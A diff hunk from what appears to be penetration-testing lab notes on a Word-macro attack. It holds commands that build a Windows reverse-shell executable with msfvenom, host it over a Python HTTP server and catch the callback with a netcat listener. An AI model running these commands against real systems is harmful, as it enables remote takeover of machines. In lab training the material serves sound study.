@@ -90,7 +90,6 @@ Save the macro and close the word doc.
 (Also see video for an alternative macro that can be used)
 
 cd Desktop/ad/ms01
-cploits
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 -f exe -o winrev443.exe
 python -m http.server -p 80
 nc -nvlp 443
